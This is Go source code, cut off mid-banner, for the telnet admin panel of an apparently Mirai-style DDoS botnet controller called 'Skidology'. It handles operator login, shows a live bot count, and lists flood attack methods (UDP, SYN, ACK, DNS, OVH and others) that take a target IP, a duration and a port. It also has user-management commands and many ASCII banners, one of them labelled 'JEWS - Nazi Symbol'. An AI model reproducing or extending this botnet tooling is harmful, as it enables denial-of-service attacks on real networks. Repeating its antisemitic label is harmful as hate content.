package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
	
    // Get username
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;35mUsername\x1b[0;37m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;35mPassword\x1b[0;37m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[31mERROR: INVALID CREDENTIALS\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d Certified Skids | Skidology | Connected as --> %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m       \x1b[0m         \x1b[1;35m        Skiddy Skiddy Bang Bang                                     \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m  ██████   ██ ▄█▀ ██▓▓█████▄  ▒█████   ██▓     ▒█████    ▄████▓██   ██▓  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ▒██    ▒  ██▄█▒ ▓██▒▒██▀ ██▌▒██▒  ██▒▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▒██  ██▒  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;35m ░ ▓██▄   ▓███▄░ ▒██▒░██   █▌▒██░  ██▒▒██░    ▒██░  ██▒▒██░▄▄▄░ ▒██ ██░  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;35m   ▒   ██▒▓██ █▄ ░██░░▓█▄   ▌▒██   ██░▒██░    ▒██   ██░░▓█  ██▓ ░ ▐██▓░  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ▒██████▒▒▒██▒ █▄░██░░▒████▓ ░ ████▓▒░░██████▒░ ████▓▒░░▒▓███▀▒ ░ ██▒▓░  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓   ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒   ██▒▒▒   \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░ ▓██ ░▒░   \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ░  ░  ░  ░ ░░ ░  ▒ ░ ░ ░  ░ ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒  ░ ░   ░ ▒ ▒ ░░    \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m       ░  ░  ░    ░     ░        ░ ░      ░  ░    ░ ░        ░ ░ ░       \x1b[0m\r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0m\x1b[1;35m|Skidology|~\033[0m\033[1;34m# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "SKIDOLOGY" || cmd == "skidology" || cmd == "CLS" {
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m     \x1b[0m         \x1b[1;35m        Skiddy Skiddy Bang Bang                                     \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m  ██████   ██ ▄█▀ ██▓▓█████▄  ▒█████   ██▓     ▒█████    ▄████▓██   ██▓  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ▒██    ▒  ██▄█▒ ▓██▒▒██▀ ██▌▒██▒  ██▒▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▒██  ██▒  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;35m ░ ▓██▄   ▓███▄░ ▒██▒░██   █▌▒██░  ██▒▒██░    ▒██░  ██▒▒██░▄▄▄░ ▒██ ██░  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;35m   ▒   ██▒▓██ █▄ ░██░░▓█▄   ▌▒██   ██░▒██░    ▒██   ██░░▓█  ██▓ ░ ▐██▓░  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ▒██████▒▒▒██▒ █▄░██░░▒████▓ ░ ████▓▒░░██████▒░ ████▓▒░░▒▓███▀▒ ░ ██▒▓░  \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓   ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒   ██▒▒▒   \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░ ▓██ ░▒░   \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m ░  ░  ░  ░ ░░ ░  ▒ ░ ░ ░  ░ ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒  ░ ░   ░ ▒ ▒ ░░    \x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[0m \x1b[1;34m       ░  ░  ░    ░     ░        ░ ░      ░  ░    ░ ░        ░ ░ ░       \x1b[0m\r\n"))
	continue
		}	

        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
			this.conn.Write([]byte("\x1b[1;35m              |\x1b[0m\x1b[1;34mHelp\x1b[0m\x1b[1;35m|           \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35mMETHODS \x1b[0m- \x1b[1;34mShows Attack Methods \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35mADMIN \x1b[0m- \x1b[1;34mShows Admin Commands   \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35mBANNERS \x1b[0m- \x1b[1;34mShows Banners        \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35mPORTS \x1b[0m- \x1b[1;34mShows Helpful Ports        \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35mRULES \x1b[0m- \x1b[1;34mShows Net Rules        \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35mCLEAR \x1b[0m- \x1b[1;34mClears Screen          \x1b[0m\r\n"))
            continue
        }

        if err != nil || cmd == "ADMIN" || cmd == "admin" {
            this.conn.Write([]byte("\x1b[35m              |\x1b[0m\x1b[1;34mAdmin\x1b[0m\x1b[35m| \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[35madduser \x1b[0m- \x1b[1;34mAdds standard user         \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[35maddadmin \x1b[0m- \x1b[1;34mAdds Admin                \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[35mdeluser \x1b[0m- \x1b[1;34mRemoves User               \x1b[0m\r\n"))
            continue
        }

        if err != nil || cmd == "ATTACKS" || cmd == "METHODS" || cmd == "attacks" || cmd == "attack" || cmd == "ATTACK" || cmd == "methods" || cmd == "method" || cmd == "METHOD" {
            this.conn.Write([]byte("\x1b[1;35m     |\x1b[0m\x1b[1;34mMethods\x1b[0m\x1b[35m| \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m STD \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]     \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m VSE \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]     \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m DNS \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]     \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m OVH \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]     \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m UDP \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]     \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m SYN \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]     \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m ACK \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]     \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m XMAS \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]    \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m FRAG \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]    \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m TCPALL \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]  \x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m UDPPLAIN \x1b[0m[\x1b[1;34mIP\x1b[0m] [\x1b[1;34mTIME\x1b[0m] \x1b[1;35mdport=\x1b[0m[\x1b[1;34mPORT\x1b[0m]\x1b[0m\r\n"))
            continue
        }
        		if err != nil || cmd == "BANNERS" || cmd == "banners" || cmd == "banner" || cmd == "BANNER" {
            this.conn.Write([]byte("\x1b[1;35m     |\x1b[0m\x1b[1;34mBanners\x1b[0m\x1b[35m| \x1b[0m\r\n"))
        	this.conn.Write([]byte("\x1b[1;35m SKIDOLOGY - Main source banner \r\n"))
        	this.conn.Write([]byte("\x1b[1;35m DISSAPEAR - Dissapear Banner   \r\n"))
            this.conn.Write([]byte("\x1b[1;35m XEON - Xeon Banner             \r\n"))
            this.conn.Write([]byte("\x1b[1;35m ICED - Iced Banner             \r\n"))
            this.conn.Write([]byte("\x1b[1;35m JEWS - Nazi Symbol             \r\n"))
            this.conn.Write([]byte("\x1b[1;35m OWARI - Owari Banner           \r\n"))
            this.conn.Write([]byte("\x1b[1;35m SORA - Sora Banner             \r\n"))
            this.conn.Write([]byte("\x1b[1;35m HOHO - HoHo Banner             \r\n"))
            this.conn.Write([]byte("\x1b[1;35m MICKEY - Mickey Mouse Banner   \r\n"))
            this.conn.Write([]byte("\x1b[1;35m REAPER - Grim Reaper Banner    \r\n"))
            this.conn.Write([]byte("\x1b[1;35m TIMEOUT - Timeout Banner       \r\n"))
            this.conn.Write([]byte("\x1b[1;35m XANAX - Xanax Banner           \r\n"))
            this.conn.Write([]byte("\x1b[1;35m SAO - SAO Banner               \r\n"))
            this.conn.Write([]byte("\x1b[1;35m HENTAI - Hentai Banner         \r\n"))
            this.conn.Write([]byte("\x1b[1;35m BATMAN - Batman Symbol         \r\n"))
            this.conn.Write([]byte("\x1b[1;35m NEKO - Neko Banner             \r\n"))
            this.conn.Write([]byte("\x1b[1;35m KATANA - Katana Banner         \r\n"))
            this.conn.Write([]byte("\x1b[1;35m CAYOSIN - Cayosin Banner       \r\n"))
            this.conn.Write([]byte("\x1b[1;35m GOOGLE - Google  Banner        \r\n"))
            this.conn.Write([]byte("\x1b[1;35m HYBRID - Hybrid Banner         \r\n"))
            this.conn.Write([]byte("\x1b[1;35m DOOM - Doom Banner             \r\n"))
            this.conn.Write([]byte("\x1b[1;35m APOLLO - Apollo Banner         \r\n"))
            this.conn.Write([]byte("\x1b[1;35m VOLTAGE - Voltage Banner       \r\n"))
            this.conn.Write([]byte("\x1b[1;35m MESSIAH - Messiah Banner       \r\n"))
            continue
        }

        if cmd == "DISSAPEAR" || cmd == "dissapear" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
		this.conn.Write([]byte("\r\x1b[90m ▓█████▄  ██▓  ██████   ██████  ▄▄▄       ██▓███  ▓█████ ▄▄▄       ██▀███   \r\n"))
		this.conn.Write([]byte("\r\x1b[90m ▒██▀ ██▌▓██▒▒██    ▒ ▒██    ▒ ▒████▄    ▓██░  ██▒▓█   ▀▒████▄    ▓██ ▒ ██▒ \r\n"))
		this.conn.Write([]byte("\r\x1b[90m ░██   █▌▒██▒░ ▓██▄   ░ ▓██▄   ▒██  ▀█▄  ▓██░ ██▓▒▒███  ▒██  ▀█▄  ▓██ ░▄█ ▒ \r\n"))
		this.conn.Write([]byte("\r\x1b[90m ░▓█▄   ▌░██░  ▒   ██▒  ▒   ██▒░██▄▄▄▄██ ▒██▄█▓▒ ▒▒▓█  ▄░██▄▄▄▄██ ▒██▀▀█▄   \r\n"))
		this.conn.Write([]byte("\r\x1b[90m ░▒████▓ ░██░▒██████▒▒▒██████▒▒ ▓█   ▓██▒▒██▒ ░  ░░▒████▒▓█   ▓██▒░██▓ ▒██▒ \r\n"))
		this.conn.Write([]byte("\r\x1b[90m  ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░▒▓▒░ ░  ░░░ ▒░ ░▒▒   ▓▒█░░ ▒▓ ░▒▓░ \r\n"))
		this.conn.Write([]byte("\r\x1b[90m  ░ ▒  ▒  ▒ ░░ ░▒  ░ ░░ ░▒  ░ ░  ▒   ▒▒ ░░▒ ░      ░ ░  ░ ▒   ▒▒ ░  ░▒ ░ ▒░ \r\n"))
		this.conn.Write([]byte("\r\x1b[90m  ░ ░  ░  ▒ ░░  ░  ░  ░  ░  ░    ░   ▒   ░░          ░    ░   ▒     ░░   ░  \r\n"))
		this.conn.Write([]byte("\r\x1b[90m    ░     ░        ░        ░        ░  ░            ░  ░     ░  ░   ░      \r\n"))
		this.conn.Write([]byte("\r\x1b[90m                                                                            \r\n"))
            continue
        }
        if cmd == "GOOGLE" || cmd == "google" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[32m                               ,,      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m   .g8'''bgd                               \x1b[32m`7MM      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m .dP'     `M                                 \x1b[32mMM      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m dM'       `   \x1b[31m,pW'Wq.   \x1b[33m,pW'Wq.   \x1b[34m.P'Ybmmm  \x1b[32mMM  \x1b[31m.gP'Ya      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m MM           \x1b[31m6W'   `Wb \x1b[33m6W'   `Wb \x1b[34m:MI  I8    \x1b[32mMM \x1b[31m,M'   Yb      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m MM.    `7MMF'\x1b[31m8M     M8 \x1b[33m8M     M8  \x1b[34mWmmmP'    \x1b[32mMM \x1b[31m8M''''''      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m `Mb.     MM  \x1b[31mYA.   ,A9 \x1b[33mYA.   ,A9 \x1b[34m8M         \x1b[32mMM \x1b[31mYM.    ,      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m   `'bmmmdPY   \x1b[31m`Ybmd9'   \x1b[33m`Ybmd9'   \x1b[34mYMMMMMb \x1b[32m.JMML.\x1b[31m`Mbmmd'      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m                         6'     dP      \r\n"))
    this.conn.Write([]byte("\r\x1b[34m                          Ybmmmd'      \r\n"))
            continue
        }
        if cmd == "MESSIAH" || cmd == "messiah" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[33m      `.▄▄ · ▄▄▌▄▄▄█..▄▄█·`.▄▄█·`·▀`·▄▄▄▌·`▄ .▄▌·     \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m       `██▌`▐██·█▄.▀·▐█ ▀.·▐█ ▀.·██·▐█·▀█ ██·▐█▌·`    \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m      '·█▌█ █▐█·█▀▀·▄▄▀▀▀█▄▄▀▀▀█▄▐█·▄█▀▀█·██▀▐█ `     \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m     ·`▐█▌▐█▌▐█▌██▄▄▌▐█▄·▐█▐█▄·▐█▐█▌▐█`·█▌██▌▐█▌·`    \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m     ·▐▀▀· ▀` ▀▀.▀▀▀·`▀▀▀▀▌·▀▀▀▀`▀▀▀▐▀`·▀·▀▀▀▐▀▀·     \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ╔═══════════════════════════════════════════════╗   \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ║\x1b[0m- - - - - - - - -\x1b[1;36mHakai \x1b[1;33mx \x1b[1;36mBlade\x1b[0m- - - - - - - - -\x1b[1;33m║   \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ║\x1b[0m- - - - - \x1b[1;33mType \x1b[1;36mHELP \x1b[1;33mfor \x1b[1;36mCommands List \x1b[0m- - - - -\x1b[1;33m║   \x1b[0m    \r\n"))
	this.conn.Write([]byte("\x1b[33m  ╚═══════════════════════════════════════════════╝   \x1b[0m    \r\n"))
            continue
        }

        if cmd == "VOLTAGE" || cmd == "voltage" {
        	this.conn.Write([]byte("\033[2J\033[1;1H"))
		this.conn.Write([]byte("\x1b[33m                                                                                 \r\n")) 
		this.conn.Write([]byte("\x1b[33m                                                                \x1b[33m          ,/     \r\n"))    
		this.conn.Write([]byte("\x1b[33m      ██\x1b[0m╗   \x1b[33m██\x1b[0m╗ \x1b[33m██████\x1b[0m╗ \x1b[33m██\x1b[0m╗  \x1b[33m████████\x1b[0m╗ \x1b[33m█████\x1b[0m╗  \x1b[33m██████\x1b[0m╗ \x1b[33m███████\x1b[0m╗ \x1b[33m        ,'/      \r\n")) 
	    this.conn.Write([]byte("\x1b[33m      ██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m╔═══\x1b[33m██\x1b[0m╗\x1b[33m██\x1b[0m║  ╚══\x1b[33m██\x1b[0m╔══╝\x1b[33m██\x1b[0m╔══\x1b[33m██\x1b[0m╗\x1b[33m██\x1b[0m╔════╝ \x1b[33m██\x1b[0m╔════╝ \x1b[33m      ,' /       \r\n")) 
		this.conn.Write([]byte("\x1b[33m      ██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║     \x1b[33m██\x1b[0m║   \x1b[33m███████\x1b[0m║\x1b[33m██\x1b[0m║  \x1b[33m███\x1b[0m╗\x1b[33m█████\x1b[0m╗   \x1b[33m    ,'  /_____,  \r\n")) 
		this.conn.Write([]byte("\x1b[33m      \x1b[0m╚\x1b[33m██\x1b[0m╗ \x1b[33m██\x1b[0m╔╝\x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║     \x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m╔══\x1b[33m██\x1b[0m║\x1b[33m██\x1b[0m║  \x1b[33m ██\x1b[0m║\x1b[33m██\x1b[0m╔══╝   \x1b[33m  .'____    ,'   \r\n")) 
		this.conn.Write([]byte("\x1b[33m      \x1b[0m ╚\x1b[33m████\x1b[0m╔╝ ╚\x1b[33m██████\x1b[0m╔╝\x1b[33m███████\x1b[0m╗\x1b[33m██\x1b[0m║   \x1b[33m██\x1b[0m║  \x1b[33m██\x1b[0m║╚\x1b[33m██████\x1b[0m╔╝\x1b[33m███████\x1b[0m╗ \x1b[33m       /  ,'     \r\n")) 
		this.conn.Write([]byte("\x1b[0m        ╚═══╝   ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ \x1b[33m      / ,'       \r\n")) 
		this.conn.Write([]byte("\x1b[33m                                                                \x1b[33m     /,'         \r\n")) 
		this.conn.Write([]byte("\x1b[33m                                                                \x1b[33m    /'           \r\n"))
            continue
        }
		if err != nil || cmd == "APOLLO" || cmd == "apollo" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\t   \x1b[0;34m .d8b. \x1b[0;37m d8888b.\x1b[0;34m  .d88b. \x1b[0;37m db     \x1b[0;34m db      \x1b[0;37m  .d88b.  \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34md8' `8b\x1b[0;37m 88  `8D\x1b[0;34m .8P  Y8.\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m .8P  Y8. \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88ooo88\x1b[0;37m 88oodD'\x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88~~~88\x1b[0;37m 88~~~  \x1b[0;34m 88    88\x1b[0;37m 88     \x1b[0;34m 88      \x1b[0;37m 88    88 \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34m88   88\x1b[0;37m 88     \x1b[0;34m `8b  d8'\x1b[0;37m 88booo.\x1b[0;34m 88booo. \x1b[0;37m `8b  d8' \r\n"))
			this.conn.Write([]byte("\t   \x1b[0;34mYP   YP\x1b[0;37m 88     \x1b[0;34m  `Y88P' \x1b[0;37m Y88888P\x1b[0;34m Y88888P \x1b[0;37m  `Y88P'  \r\n"))
			this.conn.Write([]byte("\033[1;36m                     \033[1;35m[\033[1;32m+\033[1;35m]\033[0;36mWelcome " + username + " \033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
			this.conn.Write([]byte("\033[1;36m                   \033[1;35m[\033[1;32m+\033[1;35m]\033[1;31mType help to Get Help\033[1;35m[\033[1;32m+\033[1;35m]\r\n\033[0m"))
	        continue
		}
        if cmd == "doom" || cmd == "DOOM" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[1;31m        d8888b.  .d88b.   .d88b.  .88b  d88.        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;31m        88  `8D .8P  Y8. .8P  Y8. 88'YbdP`88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;33m        88   88 88    88 88    88 88  88  88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;33m        88   88 88    88 88    88 88  88  88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m        88  .8D `8b  d8' `8b  d8' 88  88  88        \r\n"))
    this.conn.Write([]byte("\r\x1b[1;32m        Y8888D'  `Y88P'   `Y88P'  YP  YP  YP        \r\n"))
            continue
        }
        if err != nil || cmd == "cayosin" || cmd == "CAYOSIN" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;36m                 ╔═╗   ╔═╗   ╗ ╔   ╔═╗   ╔═╗   ═╔═   ╔╗╔              \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[00;0m                 ║     ║═║   ╚╔╝   ║ ║   ╚═╗    ║    ║║║              \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[0;90m                 ╚═╝   ╝ ╚   ═╝═   ╚═╝   ╚═╝   ═╝═   ╝╚╝              \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ╔═══════════════════════════════════════════════╗         \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ║\x1b[90m- - - - - \x1b[1;36m彼   ら  の  心   を  切  る\x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ║\x1b[90m- - - - - \x1b[0mType \x1b[1;36mHELP \x1b[0mfor \x1b[1;36mCommands List \x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[1;36m            ╚═══════════════════════════════════════════════╝         \x1b[0m \r\n\r\n"))
            continue
        }
        if err != nil || cmd == "katana" || cmd == "KATANA" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m╗  \x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \x1b[0;31m████████\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \x1b[0;31m███\x1b[0;37m╗   \x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m║ \x1b[0;31m██\x1b[0;37m╔╝\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗╚══\x1b[0;31m██\x1b[0;37m╔══╝\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m████\x1b[0;37m╗  \x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗\r\n"))
            this.conn.Write([]byte("\033[0;31m     █████\x1b[0;37m╔╝ \x1b[0;31m███████\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m███████\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔\x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m██\x1b[0;37m║\x1b[0;31m███████\x1b[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m╔═\x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║╚\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║ ╚\x1b[0;31m████\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;31m     \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝\r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            continue
        }
        if err != nil || cmd == "neko" || cmd == "NEKO" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\x1b[1;96m                 ███\x1b[0;95m╗   \x1b[0;96m██\x1b[0;95m╗\x1b[0;96m███████\x1b[0;95m╗\x1b[0;96m██\x1b[0;95m╗  \x1b[0;96m██\x1b[0;95m╗ \x1b[0;96m██████\x1b[0;95m╗     \r\n\x1b[0m"))
